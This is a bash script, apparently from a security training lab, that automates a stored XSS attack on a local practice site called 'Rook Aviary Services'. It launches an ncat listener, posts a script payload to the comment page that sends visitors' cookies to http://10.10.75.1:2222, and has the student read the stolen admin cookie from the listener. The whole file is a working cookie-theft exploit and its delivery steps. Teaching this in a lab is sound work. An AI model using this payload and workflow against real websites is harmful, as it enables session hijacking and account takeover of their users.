#!/bin/bash

function press_enter {
    echo 
    echo -n "Press Enter to continue"
    read foo
    echo
}


echo This script will automate the process of retrieving the cookie content through
echo the stored XSS vulnerability on Rook Aviary Services.

press_enter

# Test to make sure the server is started; if it isn't, start it for the student
curl -s 127.0.0.1:8082 | grep "Rook Aviary Services" >/dev/null
if [ $? -ne 0 ] ; then
    echo "Starting the lab web server"
    pushd . >/dev/null
    cd /home/sec504/CourseFiles/weblab/
    ./start.sh
    popd >/dev/null
    press_enter
fi


echo Starting the Ncat listener to receive the cookie from the victim: 
echo     ncat -v -n -l -k -p 2222
echo
echo Return to this window after the new Ncat window launches.
sleep 1
gnome-terminal -e 'ncat -v -n -l -k -p 2222' &

press_enter

echo Delivering the attack request against the leave_comment.php page with a
echo payload of:
echo "<script>document.location='http://10.10.75.1:2222/?'+document.cookie;</script>"

sleep 3
curl -i -s -k  -X $'POST' \
    -H $'Host: 127.0.0.1:8080' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 118' -H $'Referer: http://127.0.0.1:8080/index.php?page=leave_comment.php' -H $'Cookie: user=2' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'user=2' \
    --data-binary $'comment=%3Cscript%3Edocument.location%3D%27http%3A%2F%2F10.10.75.1%3A2222%2F%3F%27%2Bdocument.cookie%3B%3C%2Fscript%3E' \
    $'http://127.0.0.1:8080/index.php?page=leave_comment.php' >/dev/null

sleep 3

press_enter

echo Return to the other terminal to examine the status of the listener. Note that
echo the cookie from the admin victim is displayed in the 6th line of the Ncat
echo window following \"GET /?\"

press_enter

echo Press Enter one last time to stop the Ncat listener.

press_enter

killall ncat 2>/dev/null

echo Finished!
